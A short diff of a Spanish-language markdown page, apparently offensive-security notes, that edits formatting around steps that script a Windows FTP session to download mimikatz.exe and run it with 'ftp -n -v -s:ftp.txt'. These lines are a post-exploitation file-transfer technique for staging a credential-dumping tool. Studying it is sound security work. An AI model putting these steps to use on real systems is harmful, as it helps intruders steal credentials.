@@ -40,7 +40,8 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ~~~
 
-Ejecutar comandos ftp para descargar el binario
-~~~cmd
+Ejecutar comandos ftp para descargar el binario:
+
+~~~bash
 ftp -n -v -s:ftp.txt"
 ~~~
